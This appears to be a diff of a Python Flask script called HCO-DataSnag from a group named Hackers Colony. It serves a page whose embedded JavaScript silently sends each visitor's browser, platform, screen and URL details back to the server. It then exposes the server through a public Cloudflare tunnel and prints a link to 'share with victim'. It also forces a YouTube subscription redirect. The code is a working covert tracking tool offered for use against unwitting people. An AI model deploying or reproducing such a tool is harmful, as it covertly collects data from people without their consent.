@@ -1,53 +1,83 @@
 import os
 import time
-import flask
 import json
+import flask
+import threading
 from flask import Flask, request
 
 app = Flask(__name__)
 
-# HCO Banner
-os.system("clear")
-print("""\033[1;91m
-╔══════════════════════════════╗
-║      HCO - DataSnag Tool     ║
-╚══════════════════════════════╝\033[0m
-""")
+data_store = []
 
-# Not Free Notice + YouTube Redirect
-print("\033[1;93m[!] Tool is not free. Subscribe to use.\033[0m")
-time.sleep(8)
-os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
-input("\033[1;92mPress ENTER after subscribing to continue...\033[0m\n")
+@app.route('/')
+def index():
+    return '''
+    <h1>HCO-DataSnag</h1>
+    <p>This is an educational tool by <b>Hackers Colony</b>.</p>
+    <script>
+    const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: {
+            width: screen.width,
+            height: screen.height
+        },
+        url: window.location.href
+    };
+    fetch("/collect", {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    });
+    </script>
+    '''
 
-# Start Flask Server on Port 5050
-print("\033[1;94m[•] Starting Flask server...\033[0m")
+@app.route('/collect', methods=['POST'])
+def collect():
+    try:
+        info = request.get_json()
+        data_store.append(info)
+        print(f"[+] Victim Info Received:\n{json.dumps(info, indent=4)}\n")
+    except Exception as e:
+        print(f"[!] Error parsing victim data: {e}")
+    return "OK"
+
 def run_flask():
-    app.run(host='0.0.0.0', port=5050)
+    app.run(host="0.0.0.0", port=5050)
 
-# Start Cloudflared Tunnel
-print("\033[1;94m[•] Starting Cloudflare tunnel...\033[0m")
-os.system("pkill cloudflared > /dev/null 2>&1")
-os.system("cloudflared tunnel --url http://localhost:5050 > .cloudflared.log 2>&1 &")
-time.sleep(6)
+def start_cloudflared():
+    os.system("pkill cloudflared > /dev/null 2>&1")
+    os.system("cloudflared tunnel --url http://localhost:5050 > cf.log 2>&1 &")
+    time.sleep(8)
 
-try:
-    import requests
-    r = requests.get("http://127.0.0.1:4040/api/tunnels")
-    data = r.json()
-    url = data['tunnels'][0]['public_url']
-    print(f"\033[1;92m[✓] Share this link with victim: {url}\033[0m\n")
-except:
-    print("\033[1;91m[×] Failed to get Cloudflare URL. Make sure tunnel started properly.\033[0m")
+    try:
+        with open("cf.log", "r") as file:
+            content = file.read()
+            for line in content.splitlines():
+                if "trycloudflare.com" in line:
+                    link = line.strip().split(" ")[-1]
+                    print(f"[✓] Share this link with victim: {link}")
+                    return
+    except:
+        pass
 
-# Endpoint to receive victim data
-@app.route('/', methods=['POST'])
-def receive():
-    data = request.get_json()
-    print("\n\033[1;96m[Victim Connected]\033[0m\n")
-    for key, value in data.items():
-        print(f"\033[1;92m{key}:\033[0m {value}")
-    return 'OK'
+    print("[×] Failed to get Cloudflare URL. Make sure tunnel started properly.")
 
-if __name__ == '__main__':
-    run_flask()
+def main():
+    print("[•] Installing requirements...")
+    os.system("pip install flask > /dev/null 2>&1")
+    print("[•] Redirecting to YouTube in 8 seconds...")
+    time.sleep(8)
+    os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
+    input("Press ENTER after subscribing to continue...")
+
+    print("[•] Starting Flask server...")
+    threading.Thread(target=run_flask).start()
+    time.sleep(4)
+
+    print("[•] Starting Cloudflare tunnel...")
+    start_cloudflared()
+
+if __name__ == "__main__":
+    main()
